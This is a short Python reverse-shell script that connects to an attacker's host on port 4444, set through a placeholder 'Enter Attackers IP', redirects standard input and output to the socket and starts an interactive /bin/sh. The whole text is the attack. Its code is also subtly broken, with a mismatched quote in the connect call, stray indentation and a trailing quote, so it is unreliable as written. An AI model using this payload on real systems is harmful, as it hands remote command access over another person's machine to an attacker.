import socket
import subprocess
import os

lhost = "Enter Attackers IP"
lport = 4444

  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
  s.connect(("lhost,lport))
  os.dup2(s.fileno(),0) 
  os.dup2(s.fileno(),1) 
  os.dup2(s.fileno(),2)
  p=subprocess.call(["/bin/sh","-i"]);'
